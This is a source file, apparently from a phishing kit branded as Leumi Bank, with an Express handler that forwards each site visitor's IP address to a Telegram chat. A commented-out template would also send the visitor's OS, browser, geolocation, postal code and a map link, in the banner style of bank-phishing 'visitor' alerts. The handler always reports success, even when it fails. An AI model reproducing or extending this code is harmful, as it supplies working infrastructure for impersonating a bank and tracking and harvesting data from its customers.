// const getUserAgent = require("../utils/getUserAgent");
const { telegramService } = require("../services");

module.exports.recordVisit = async (req, res, next) => {
  try {
    const { visitor } = req.body;

    // const { osName, browser, ua } = getUserAgent(req);
    // const browserName = `${browser.name} ${browser.version}`;

    // let message = "";
    // message += "[=====>  LEUMI BANK => VISITOR  <=====]\n";
    // message += `[ + OS: ${osName}\n`;
    // message += `[ + Browser: ${browserName}\n`;
    // message += `[ + User Agent: ${ua}\n`;
    // message += `[ + IP: ${visitor.IPv4 || "Not detected"}\n`;
    // message += `[ + Country: ${visitor.country_name || "Unknown"}\n`;
    // message += `[ + Country Code: ${visitor.country_code || "Unknown"}\n`;
    // message += `[ + State: ${visitor.state || "Unknown"}\n`;
    // message += `[ + City: ${visitor.city || "Unknown"}\n`;
    // message += `[ + Postal Code: ${visitor.postal || "Unknown"}\n`;
    // message += `[ + Location: ${
    //   visitor.longitude
    //     ? `${getLocationLink(visitor.longitude, visitor.latitude)}`
    //     : "Unknown"
    // }\n`;
    // message += `[ + Visit Date: ${visitor.visitDate || "Unknown"}\n`;
    // message += `[ + Visit Time: ${visitor.visitTime || "Unknown"}\n`;
    // message += "[=====>  LEUMI BANK => VISITOR  <=====]";

    const message = `New visitor IP: ${visitor.IPv4}`;

    await telegramService.sendMessage(message);

    res.status(200).json({ success: true });
  } catch (err) {
    res.status(200).json({ success: true });
  }
};

const getLocationLink = (longitude, latitude) => {
  if (!longitude || !latitude) {
    return null;
  }

  return `https://www.google.com/maps?q=${latitude},${longitude}`;
};
